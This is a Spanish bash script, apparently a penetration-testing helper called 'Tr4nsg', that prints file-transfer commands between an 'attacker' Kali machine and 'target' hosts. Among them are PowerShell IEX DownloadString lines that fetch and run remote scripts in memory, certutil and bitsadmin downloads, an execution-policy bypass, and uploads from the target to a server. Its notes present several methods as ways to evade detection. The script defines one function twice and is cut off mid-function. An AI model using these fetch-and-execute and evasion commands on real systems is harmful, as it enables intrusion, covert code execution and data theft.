#!/bin/bash

# Colores para el menú
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Variables globales para los campos comunes
TARGET_IP=""
TARGET_DOMAIN=""
USERNAME=""
PASSWORD=""
LOCAL_FILE=""
REMOTE_FILE=""
PORT=""

# Función para solicitar y validar IP
get_target_ip() {
    while true; do
        echo -n "Ingrese la IP objetivo (ej: 192.168.1.100): "
        read -r TARGET_IP
        if [[ $TARGET_IP =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
            IFS='.' read -r -a ip_parts <<< "$TARGET_IP"
            valid=true
            for part in "${ip_parts[@]}"; do
                if [ "$part" -gt 255 ] || [ "$part" -lt 0 ]; then
                    valid=false
                    break
                fi
            done
            if [ "$valid" = true ]; then
                break
            fi
        fi
        echo -e "${RED}IP inválida. Por favor, ingrese una IP válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- 192.168.1.100"
        echo "- 10.0.0.1"
        echo "- 172.16.0.1"
    done
}

# Función para solicitar y validar dominio
get_target_domain() {
    while true; do
        echo -n "Ingrese el dominio objetivo (ej: ejemplo.com o sub.ejemplo.com): "
        read -r TARGET_DOMAIN
        if [[ $TARGET_DOMAIN =~ ^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](\.[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9])*\.[a-zA-Z]{2,}$ ]]; then
            break
        fi
        echo -e "${RED}Dominio inválido. Por favor, ingrese un dominio válido.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- ejemplo.com"
        echo "- sub.ejemplo.com"
        echo "- dominio.org"
        echo "- sub1.sub2.ejemplo.com"
    done
}

# Función para solicitar credenciales
get_credentials() {
    while true; do
        echo -n "Ingrese el nombre de usuario: "
        read -r USERNAME
        if [[ $USERNAME =~ ^[a-zA-Z0-9_\-\.]+$ ]]; then
            break
        fi
        echo -e "${RED}Nombre de usuario inválido. Por favor, use solo letras, números, guiones y puntos.${NC}"
    done

    while true; do
        echo -n "Ingrese la contraseña: "
        read -rs PASSWORD
        echo
        if [ -n "$PASSWORD" ]; then
            break
        fi
        echo -e "${RED}La contraseña no puede estar vacía.${NC}"
    done
}

# Función para solicitar archivos
get_files() {
    while true; do
        echo -n "Ingrese la ruta del archivo local: "
        read -r LOCAL_FILE
        if [ -f "$LOCAL_FILE" ]; then
            break
        fi
        echo -e "${RED}Archivo no encontrado. Por favor, ingrese una ruta válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- /ruta/al/archivo.txt"
        echo "- C:\\Windows\\Temp\\archivo.exe"
        echo "- ./archivo.sh"
    done

    while true; do
        echo -n "Ingrese la ruta del archivo remoto: "
        read -r REMOTE_FILE
        # Validación más flexible para rutas
        if [[ $REMOTE_FILE =~ ^[a-zA-Z0-9_\-\.\/\\:]+$ ]] || \
           [[ $REMOTE_FILE =~ ^[a-zA-Z]:[\/\\][a-zA-Z0-9_\-\.\/\\]+$ ]] || \
           [[ $REMOTE_FILE =~ ^[\/\\][a-zA-Z0-9_\-\.\/\\]+$ ]] || \
           [[ $REMOTE_FILE =~ ^[a-zA-Z0-9_\-\.\/\\]+$ ]]; then
            break
        fi
        echo -e "${RED}Ruta inválida. Por favor, ingrese una ruta válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- /tmp/archivo.txt"
        echo "- C:\\Windows\\Temp\\archivo.exe"
        echo "- ./archivo.sh"
        echo "- /home/kali/archivo.sh"
        echo "- archivo.txt"
    done
}

# Función para solicitar puerto
get_port() {
    while true; do
        echo -n "Ingrese el puerto (1-65535): "
        read -r PORT
        if [[ $PORT =~ ^[0-9]+$ ]] && [ "$PORT" -ge 1 ] && [ "$PORT" -le 65535 ]; then
            break
        fi
        echo -e "${RED}Puerto inválido. Por favor, ingrese un puerto válido.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- 80 (HTTP)"
        echo "- 443 (HTTPS)"
        echo "- 445 (SMB)"
        echo "- 22 (SSH)"
        echo "- 21 (FTP)"
    done
}

# Función para solicitar URL
get_url() {
    while true; do
        echo -n "Ingrese la URL (ej: http://ejemplo.com o http://192.168.1.100): "
        read -r TARGET_URL
        # Validación más flexible que acepta IPs y dominios
        if [[ $TARGET_URL =~ ^https?://[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9](\.[a-zA-Z]{2,})?(\.[a-zA-Z]{2,})?(:[0-9]+)?(/.*)?$ ]] || \
           [[ $TARGET_URL =~ ^https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(:[0-9]+)?(/.*)?$ ]]; then
            break
        fi
        echo -e "${RED}URL inválida. Por favor, ingrese una URL válida.${NC}"
        echo -e "${YELLOW}Ejemplos válidos:${NC}"
        echo "- http://ejemplo.com"
        echo "- http://192.168.1.100"
        echo "- http://ejemplo.com:8080"
        echo "- http://192.168.1.100:8000"
        echo "- http://sub.ejemplo.com"
    done
}

# Función para mostrar el menú principal
show_menu() {
    clear
    echo -e "${BLUE}=== Tr4nsg - Guía de Transferencia de Archivos ===${NC}"
    echo -e "${YELLOW}Seleccione el escenario de transferencia:${NC}"
    echo -e "${GREEN}1.${NC} Kali Linux → Windows"
    echo -e "${GREEN}2.${NC} Windows → Windows"
    echo -e "${GREEN}3.${NC} Kali Linux → Kali Linux"
    echo -e "${GREEN}4.${NC} Windows → Kali Linux"
    echo -e "${GREEN}5.${NC} Salir"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Kali → Windows
show_kali_to_windows_menu() {
    clear
    echo -e "${BLUE}=== Transferencia desde Kali Linux hacia Windows ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en Kali Linux${NC}"
    echo -e "${GREEN}1.${NC} SCP (requiere SSH en Windows)"
    echo -e "${GREEN}2.${NC} Python HTTP Server + PowerShell Download"
    echo -e "${GREEN}3.${NC} Netcat"
    echo -e "${GREEN}4.${NC} FTP"
    echo -e "${GREEN}5.${NC} SMB (usando impacket-smbserver)"
    echo -e "${GREEN}6.${NC} Base64 + PowerShell"
    echo -e "${GREEN}7.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Windows → Windows
show_windows_to_windows_menu() {
    clear
    echo -e "${BLUE}=== Transferencia entre máquinas Windows ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en la máquina Windows destino${NC}"
    echo -e "${GREEN}1.${NC} PowerShell Web Downloads"
    echo -e "${GREEN}2.${NC} SMB Shares"
    echo -e "${GREEN}3.${NC} FTP"
    echo -e "${GREEN}4.${NC} Bitsadmin"
    echo -e "${GREEN}5.${NC} Certutil"
    echo -e "${GREEN}6.${NC} Base64"
    echo -e "${GREEN}7.${NC} PowerShell Fileless"
    echo -e "${GREEN}8.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Kali → Kali
show_kali_to_kali_menu() {
    clear
    echo -e "${BLUE}=== Transferencia entre máquinas Kali Linux ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en la máquina Kali destino${NC}"
    echo -e "${GREEN}1.${NC} SCP"
    echo -e "${GREEN}2.${NC} Netcat"
    echo -e "${GREEN}3.${NC} Python HTTP Server + wget/curl"
    echo -e "${GREEN}4.${NC} FTP"
    echo -e "${GREEN}5.${NC} Base64"
    echo -e "${GREEN}6.${NC} Rsync"
    echo -e "${GREEN}7.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para mostrar el menú Windows → Kali
show_windows_to_kali_menu() {
    clear
    echo -e "${BLUE}=== Transferencia desde Windows hacia Kali Linux ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Los comandos se ejecutan en la máquina Windows${NC}"
    echo -e "${GREEN}1.${NC} PowerShell Web Upload"
    echo -e "${GREEN}2.${NC} FTP"
    echo -e "${GREEN}3.${NC} Netcat"
    echo -e "${GREEN}4.${NC} Base64 + Python"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo
    echo -n "Seleccione una opción: "
}

# Función para implementar Kali → Windows con SMB
implement_kali_to_windows_smb() {
    echo -e "${BLUE}=== Transferencia Kali → Windows usando SMB ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
    echo "1. Crear un servidor SMB básico:"
    echo "sudo impacket-smbserver share /tmp/smbshare -smb2support"
    echo
    echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
    echo "1. Conectarse al share y copiar el archivo:"
    echo "net use \\\\<IP_KALI>\\share /user:guest"
    echo "copy \\\\<IP_KALI>\\share\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
}

# Función para implementar Kali → Windows con Python + PowerShell
implement_kali_to_windows_python_powershell() {
    echo -e "${BLUE}=== Transferencia Kali → Windows usando Python + PowerShell ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
    echo "1. Crear un servidor HTTP con Python:"
    echo "python3 -m http.server 8000"
    echo
    echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
    echo "1. Usar PowerShell para descargar el archivo:"
    echo "(New-Object Net.WebClient).DownloadFile('http://<IP_KALI>:8000/archivo.exe', 'C:\\Windows\\Temp\\archivo.exe')"
}

# Función para implementar Windows → Windows con SMB
implement_windows_to_windows_smb() {
    echo -e "${BLUE}=== Transferencia Windows → Windows usando SMB ===${NC}"
    echo -e "${YELLOW}PASO 1: En Windows origen${NC}"
    echo "1. Compartir una carpeta:"
    echo "net share sharename=C:\\shared /grant:everyone,full"
    echo
    echo -e "${YELLOW}PASO 2: En Windows destino${NC}"
    echo "1. Conectarse al share:"
    echo "net use \\\\<IP_WINDOWS>\\sharename /user:username password"
    echo "2. Copiar archivo:"
    echo "copy \\\\<IP_WINDOWS>\\sharename\\archivo.exe C:\\Windows\\Temp\\archivo.exe"
}

# Función para implementar Kali → Kali con Netcat
implement_kali_to_kali_netcat() {
    echo -e "${BLUE}=== Transferencia Kali → Kali usando Netcat ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali destino (receptor)${NC}"
    echo "1. Escuchar en un puerto:"
    echo "nc -l -p 1234 > archivo.sh"
    echo
    echo -e "${YELLOW}PASO 2: En Kali origen (emisor)${NC}"
    echo "1. Enviar el archivo:"
    echo "nc <IP_KALI_DESTINO> 1234 < archivo.sh"
}

# Función para implementar Windows → Kali con PowerShell
implement_windows_to_kali_powershell() {
    echo -e "${BLUE}=== Transferencia Windows → Kali usando PowerShell ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali Linux (receptor)${NC}"
    echo "1. Crear un servidor HTTP con Python:"
    echo "python3 -m http.server 8000"
    echo
    echo -e "${YELLOW}PASO 2: En Windows (emisor)${NC}"
    echo "1. Subir archivo usando PowerShell:"
    echo '$filePath = "C:\\Windows\\Temp\\archivo.exe"'
    echo '$url = "http://<IP_KALI>:8000/upload"'
    echo '$form = @{'
    echo '    file = Get-Item -Path $filePath'
    echo '}'
    echo 'Invoke-WebRequest -Uri $url -Method Post -Form $form'
}

# Función para PowerShell Web Downloads
implement_powershell_web_downloads() {
    echo -e "${BLUE}=== PowerShell Web Downloads ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina objetivo${NC}"
    echo -e "${YELLOW}Descripción: Descarga archivos desde un servidor web hacia la máquina objetivo${NC}"
    
    echo -e "${YELLOW}Métodos disponibles:${NC}"
    echo "1. DownloadFile"
    echo "2. DownloadFileAsync"
    echo "3. Invoke-WebRequest"
    echo "4. Invoke-WebRequest con User Agent personalizado"
    echo

    echo -e "${GREEN}1. DownloadFile Method:${NC}"
    echo "(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/archivo.exe', 'C:\\Windows\\Temp\\archivo.exe')"
    echo

    echo -e "${GREEN}2. DownloadFileAsync Method:${NC}"
    echo "(New-Object Net.WebClient).DownloadFileAsync('http://192.168.1.100/archivo.exe', 'C:\\Windows\\Temp\\archivo.exe')"
    echo

    echo -e "${GREEN}3. Invoke-WebRequest Method:${NC}"
    echo "Invoke-WebRequest -Uri 'http://192.168.1.100/archivo.exe' -OutFile 'C:\\Windows\\Temp\\archivo.exe'"
    echo

    echo -e "${GREEN}4. Invoke-WebRequest con User Agent:${NC}"
    echo "Invoke-WebRequest -Uri 'http://192.168.1.100/archivo.exe' -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile 'C:\\Windows\\Temp\\archivo.exe'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Reemplace '192.168.1.100' con la IP de su servidor"
    echo "2. Ajuste la ruta de destino según sus necesidades"
    echo "3. El método DownloadFileAsync es útil para archivos grandes"
    echo "4. El User Agent personalizado puede ayudar a evadir detección"
}

# Función para PowerShell Fileless Downloads
implement_powershell_fileless() {
    echo -e "${BLUE}=== PowerShell Fileless Downloads ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método ejecuta scripts directamente en memoria sin escribir en disco${NC}"
    
    echo -e "${YELLOW}Métodos disponibles:${NC}"
    echo "1. IEX (Invoke-Expression)"
    echo "2. IEX con Pipeline"
    echo

    echo -e "${GREEN}1. IEX Method:${NC}"
    echo "Este método descarga y ejecuta un script directamente en memoria:"
    echo
    echo "Ejemplo 1 - Script simple:"
    echo "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')"
    echo
    echo "Ejemplo 2 - Script con parámetros:"
    echo "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') -Parametro1 'valor1' -Parametro2 'valor2'"
    echo
    echo "Ejemplo 3 - Script con credenciales:"
    echo "\$creds = Get-Credential"
    echo "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') -Credential \$creds"
    echo

    echo -e "${GREEN}2. IEX with Pipeline:${NC}"
    echo "Este método es similar pero usa el operador pipe para la ejecución:"
    echo
    echo "Ejemplo 1 - Script simple:"
    echo "(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') | IEX"
    echo
    echo "Ejemplo 2 - Script con salida a variable:"
    echo "\$resultado = (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') | IEX"
    echo
    echo "Ejemplo 3 - Script con filtrado:"
    echo "(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1') | IEX | Where-Object { \$_ -match 'patrón' }"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. El script se ejecuta directamente en memoria, no se escribe en disco"
    echo "2. Útil para evadir detección de archivos maliciosos"
    echo "3. Requiere que el script sea accesible vía HTTP/HTTPS"
    echo "4. El script debe estar en formato PowerShell (.ps1)"
    echo "5. Se recomienda usar HTTPS para mayor seguridad"
    echo
    echo -e "${YELLOW}Consideraciones de seguridad:${NC}"
    echo "1. Verificar la fuente del script antes de ejecutarlo"
    echo "2. Usar HTTPS para evitar interceptación del tráfico"
    echo "3. Considerar firmar el script con un certificado digital"
    echo "4. Implementar políticas de ejecución de scripts apropiadas"
    echo
    echo -e "${YELLOW}Soluciones a problemas comunes:${NC}"
    echo "1. Error de ejecución de scripts:"
    echo "   - Verificar la política de ejecución: Get-ExecutionPolicy"
    echo "   - Ajustar la política si es necesario: Set-ExecutionPolicy Bypass -Scope Process"
    echo "2. Error de conexión:"
    echo "   - Verificar que la URL sea accesible"
    echo "   - Comprobar la conectividad de red"
    echo "3. Error de contenido:"
    echo "   - Verificar que el script sea válido"
    echo "   - Comprobar la codificación del archivo"
}

# Función para SMB Transfers
implement_smb_transfers() {
    echo -e "${BLUE}=== SMB Transfers ===${NC}"
    
    get_target_ip
    get_credentials
    get_files
    
    echo -e "${YELLOW}¿Qué es SMB?${NC}"
    echo "El protocolo de bloque de mensajes del servidor (SMB) que se ejecuta en el puerto TCP/445"
    echo "es común en redes empresariales con servicios Windows. Permite transferir archivos"
    echo "desde y hacia servidores remotos."
    echo

    echo -e "${GREEN}1. Configuración del servidor SMB básico:${NC}"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare"
    echo

    echo -e "${GREEN}2. Configuración del servidor SMB con autenticación:${NC}"
    echo "sudo impacket-smbserver share -smb2support /tmp/smbshare -user $USERNAME -password $PASSWORD"
    echo

    echo -e "${YELLOW}Métodos de transferencia:${NC}"
    echo -e "${GREEN}1. Copia directa (sin autenticación):${NC}"
    echo "copy \\\\$TARGET_IP\\share\\$LOCAL_FILE $REMOTE_FILE"
    echo
    echo -e "${GREEN}2. Copia con autenticación:${NC}"
    echo "net use n: \\\\$TARGET_IP\\share /user:$USERNAME $PASSWORD"
    echo "copy n:\\$LOCAL_FILE $REMOTE_FILE"
    echo
    echo -e "${GREEN}3. Usando PowerShell:${NC}"
    echo "Copy-Item -Path '\\\\$TARGET_IP\\share\\$LOCAL_FILE' -Destination '$REMOTE_FILE'"
}

# Función para Métodos Alternativos
implement_alternative_methods() {
    echo -e "${BLUE}=== Métodos Alternativos de Transferencia ===${NC}"
    
    echo -e "${YELLOW}1. Bitsadmin:${NC}"
    echo "bitsadmin /transfer n http://<IP>/file.exe C:\\Temp\\file.exe"
    echo

    echo -e "${YELLOW}2. Certutil:${NC}"
    echo "certutil.exe -verifyctl -split -f http://<IP>/file.exe"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Bitsadmin es una herramienta legítima de Windows"
    echo "2. Certutil es útil para evadir detección"
    echo "3. Ambos métodos son nativos de Windows"
}

# Función para Wget
implement_wget() {
    echo -e "${BLUE}=== Transferencia con Wget ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina atacante${NC}"
    echo -e "${YELLOW}Descripción: Descarga archivos desde un servidor web hacia la máquina atacante${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "wget https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Descarga con User Agent:${NC}"
    echo "wget --user-agent='Mozilla/5.0' https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Descarga en segundo plano:${NC}"
    echo "wget -b https://<URL>/file.sh -O /tmp/file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Wget es una herramienta común en Linux"
    echo "2. Permite descargas recursivas"
    echo "3. Soporta múltiples protocolos (HTTP, HTTPS, FTP)"
}

# Función para cURL
implement_curl() {
    echo -e "${BLUE}=== Transferencia con cURL ===${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "curl -o /tmp/file.sh https://<URL>/file.sh"
    echo

    echo -e "${YELLOW}Descarga con User Agent:${NC}"
    echo "curl -A 'Mozilla/5.0' -o /tmp/file.sh https://<URL>/file.sh"
    echo

    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "curl -F 'file=@/path/to/file' https://<URL>/upload"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. cURL es más versátil que wget"
    echo "2. Soporta más protocolos"
    echo "3. Mejor para scripting"
}

# Función para PHP
implement_php() {
    echo -e "${BLUE}=== Transferencia con PHP ===${NC}"
    
    echo -e "${YELLOW}Descarga básica:${NC}"
    echo "php -r '\$file = file_get_contents(\"https://<URL>/file.sh\"); file_put_contents(\"file.sh\",\$file);'"
    echo

    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "php -r '\$ch = curl_init(); curl_setopt(\$ch, CURLOPT_URL, \"https://<URL>/upload\"); curl_setopt(\$ch, CURLOPT_POST, 1); curl_setopt(\$ch, CURLOPT_POSTFIELDS, [\"file\" => \"@/path/to/file\"]); curl_exec(\$ch);'"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil si PHP está disponible"
    echo "2. Puede evadir algunas restricciones"
    echo "3. Soporta múltiples protocolos"
}

# Función para SCP
implement_scp() {
    echo -e "${BLUE}=== Transferencia con SCP ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina atacante${NC}"
    echo -e "${YELLOW}Descripción: Transfiere archivos desde la máquina atacante hacia la máquina objetivo${NC}"
    
    get_target_ip
    get_credentials
    get_port
    get_files
    
    echo -e "${YELLOW}Subida de archivo:${NC}"
    echo "scp -P $PORT $LOCAL_FILE $USERNAME@$TARGET_IP:$REMOTE_FILE"
    echo

    echo -e "${YELLOW}Descarga de archivo:${NC}"
    echo "scp -P $PORT $USERNAME@$TARGET_IP:$REMOTE_FILE $LOCAL_FILE"
    echo

    echo -e "${YELLOW}Subida de directorio:${NC}"
    echo "scp -r -P $PORT $LOCAL_FILE $USERNAME@$TARGET_IP:$REMOTE_FILE"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere acceso SSH"
    echo "2. Transferencia encriptada"
    echo "3. Útil para transferencias seguras"
}

# Función para Netcat
implement_netcat() {
    echo -e "${BLUE}=== Transferencia con Netcat ===${NC}"
    
    echo -e "${YELLOW}En el servidor (receptor):${NC}"
    echo "nc -l -p 1234 > file.sh"
    echo

    echo -e "${YELLOW}En el cliente (emisor):${NC}"
    echo "nc <IP> 1234 < file.sh"
    echo

    echo -e "${YELLOW}Transferencia encriptada (con cryptcat):${NC}"
    echo "cryptcat -l -p 1234 > file.sh"
    echo "cryptcat <IP> 1234 < file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Simple pero efectivo"
    echo "2. Útil cuando otros métodos están bloqueados"
    echo "3. Puede ser detectado por firewalls"
}

# Función para Python
implement_python() {
    echo -e "${BLUE}=== Transferencia con Python ===${NC}"
    
    echo -e "${YELLOW}Descarga con requests:${NC}"
    echo "python3 -c 'import requests; r = requests.get(\"$TARGET_URL\"); open(\"$LOCAL_FILE\", \"wb\").write(r.content)'"
    echo

    echo -e "${YELLOW}Servidor HTTP simple (para compartir archivos):${NC}"
    echo "python3 -m http.server 8000"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere el módulo requests instalado"
    echo "2. Útil para scripting y automatización"
    echo "3. El servidor HTTP simple es útil para compartir archivos"
}

# Función para Base64 en Linux
implement_base64() {
    echo -e "${BLUE}=== Transferencia con Base64 en Linux ===${NC}"
    
    echo -e "${YELLOW}Codificar archivo:${NC}"
    echo "base64 file.sh > file.sh.b64"
    echo "cat file.sh | base64 > file.sh.b64"
    echo

    echo -e "${YELLOW}Decodificar archivo:${NC}"
    echo "base64 -d file.sh.b64 > file.sh"
    echo "cat file.sh.b64 | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Codificar y enviar por pipe:${NC}"
    echo "cat file.sh | base64 | nc -l -p 1234"
    echo "nc <IP> 1234 | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Codificar y pegar en terminal:${NC}"
    echo "base64 file.sh"
    echo "# Copiar la salida y en el destino:"
    echo "echo 'CONTENIDO_BASE64' | base64 -d > file.sh"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil para transferir archivos binarios como texto"
    echo "2. Puede evadir algunas restricciones de firewall"
    echo "3. Aumenta el tamaño del archivo en ~33%"
    echo "4. Útil para transferir archivos por chat o correo"
}

# Función para FTP Transfers en Windows
implement_ftp_transfers() {
    echo -e "${BLUE}=== FTP Transfers en Windows ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$ftp = "ftp://username:password@server.com/file.exe"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.DownloadFile($ftp, "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}2. Usando comando FTP:${NC}"
    echo "ftp server.com"
    echo "username"
    echo "password"
    echo "get file.exe"
    echo "bye"
    echo

    echo -e "${YELLOW}3. Usando script FTP:${NC}"
    echo "echo open server.com > ftp.txt"
    echo "echo username >> ftp.txt"
    echo "echo password >> ftp.txt"
    echo "echo get file.exe >> ftp.txt"
    echo "echo bye >> ftp.txt"
    echo "ftp -s:ftp.txt"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. FTP envía credenciales en texto plano"
    echo "2. Considerar usar SFTP o FTPS para mayor seguridad"
    echo "3. Verificar permisos de escritura en el directorio destino"
}

# Función para Base64 en Windows
implement_base64() {
    echo -e "${BLUE}=== Base64 en Windows ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$content = Get-Content -Path "file.exe" -Encoding Byte'
    echo '$base64 = [Convert]::ToBase64String($content)'
    echo '$base64 | Out-File -FilePath "file.exe.b64"'
    echo

    echo -e "${YELLOW}2. Decodificar con PowerShell:${NC}"
    echo '$base64 = Get-Content -Path "file.exe.b64"'
    echo '$bytes = [Convert]::FromBase64String($base64)'
    echo '[IO.File]::WriteAllBytes("file.exe", $bytes)'
    echo

    echo -e "${YELLOW}3. Usando certutil:${NC}"
    echo "certutil -encode file.exe file.b64"
    echo "certutil -decode file.b64 file.exe"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Útil para transferir archivos binarios como texto"
    echo "2. Puede evadir algunas restricciones de firewall"
    echo "3. Aumenta el tamaño del archivo en ~33%"
}

# Función para PowerShell Web Uploads
implement_powershell_web_uploads() {
    echo -e "${BLUE}=== PowerShell Web Uploads ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método debe ejecutarse en la máquina objetivo${NC}"
    echo -e "${YELLOW}Descripción: Sube archivos desde la máquina objetivo hacia un servidor web${NC}"
    
    echo -e "${YELLOW}1. Usando Invoke-WebRequest:${NC}"
    echo '$filePath = "C:\Users\Public\file.exe"'
    echo '$url = "http://server.com/upload"'
    echo '$form = @{'
    echo '    file = Get-Item -Path $filePath'
    echo '}'
    echo 'Invoke-WebRequest -Uri $url -Method Post -Form $form'
    echo

    echo -e "${YELLOW}2. Usando WebClient:${NC}"
    echo '$wc = New-Object System.Net.WebClient'
    echo '$wc.UploadFile("http://server.com/upload", "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}3. Usando curl.exe:${NC}"
    echo "curl.exe -F \"file=@C:\Users\Public\file.exe\" http://server.com/upload"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Verificar permisos de escritura en el servidor"
    echo "2. Considerar límites de tamaño de archivo"
    echo "3. Usar HTTPS para mayor seguridad"
}

# Función para SMB Uploads
implement_smb_uploads() {
    echo -e "${BLUE}=== SMB Uploads ===${NC}"
    
    echo -e "${YELLOW}1. Usando copy:${NC}"
    echo "copy C:\Users\Public\file.exe \\\\server\share\file.exe"
    echo

    echo -e "${YELLOW}2. Usando PowerShell:${NC}"
    echo "Copy-Item -Path 'C:\Users\Public\file.exe' -Destination '\\\\server\\share\\file.exe'"
    echo

    echo -e "${YELLOW}3. Usando net use:${NC}"
    echo "net use n: \\\\server\share /user:username password"
    echo "copy C:\Users\Public\file.exe n:\file.exe"
    echo "net use n: /delete"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. Requiere permisos de escritura en el share"
    echo "2. Las nuevas versiones de Windows bloquean acceso anónimo"
    echo "3. Considerar usar credenciales válidas"
}

# Función para FTP Uploads
implement_ftp_uploads() {
    echo -e "${BLUE}=== FTP Uploads ===${NC}"
    
    echo -e "${YELLOW}1. Usando PowerShell:${NC}"
    echo '$ftp = "ftp://username:password@server.com/"'
    echo '$webclient = New-Object System.Net.WebClient'
    echo '$webclient.UploadFile($ftp, "C:\Users\Public\file.exe")'
    echo

    echo -e "${YELLOW}2. Usando comando FTP:${NC}"
    echo "ftp server.com"
    echo "username"
    echo "password"
    echo "put file.exe"
    echo "bye"
    echo

    echo -e "${YELLOW}3. Usando script FTP:${NC}"
    echo "echo open server.com > ftp.txt"
    echo "echo username >> ftp.txt"
    echo "echo password >> ftp.txt"
    echo "echo put file.exe >> ftp.txt"
    echo "echo bye >> ftp.txt"
    echo "ftp -s:ftp.txt"
    echo

    echo -e "${YELLOW}Notas importantes:${NC}"
    echo "1. FTP envía credenciales en texto plano"
    echo "2. Verificar permisos de escritura en el servidor FTP"
    echo "3. Considerar usar SFTP o FTPS para mayor seguridad"
}

# Función para implementar Kali → Windows con Base64
implement_kali_to_windows_base64() {
    echo -e "${BLUE}=== Transferencia Kali → Windows usando Base64 ===${NC}"
    echo -e "${YELLOW}PASO 1: En Kali Linux (máquina atacante)${NC}"
    echo "1. Codificar el archivo en base64:"
    echo "base64 archivo.exe > archivo.exe.b64"
    echo
    echo -e "${YELLOW}PASO 2: En Windows (máquina objetivo)${NC}"
    echo "1. Decodificar el archivo usando PowerShell:"
    echo '$base64 = Get-Content -Path "archivo.exe.b64"'
    echo '$bytes = [Convert]::FromBase64String($base64)'
    echo '[IO.File]::WriteAllBytes("C:\\Windows\\Temp\\archivo.exe", $bytes)'
    echo
    echo -e "${YELLOW}Alternativa con certutil:${NC}"
    echo "certutil -decode archivo.exe.b64 C:\\Windows\\Temp\\archivo.exe"
}

# Función para implementar Windows → Windows con PowerShell Fileless
implement_windows_to_windows_fileless() {
    echo -e "${BLUE}=== Transferencia Windows → Windows usando PowerShell Fileless ===${NC}"
    echo -e "${YELLOW}IMPORTANTE: Este método ejecuta el script directamente en memoria${NC}"
    echo -e "${YELLOW}PASO 1: En Windows origen${NC}"
    echo "1. Crear un servidor web con el script"
    echo
    echo -e "${YELLOW}PASO 2: En Windows destino${NC}"
    echo "1. Ejecutar el script en memoria:"
    echo "IEX (New-Object Net.WebClient).DownloadString('http://<IP_WINDOWS>/script.ps1')"
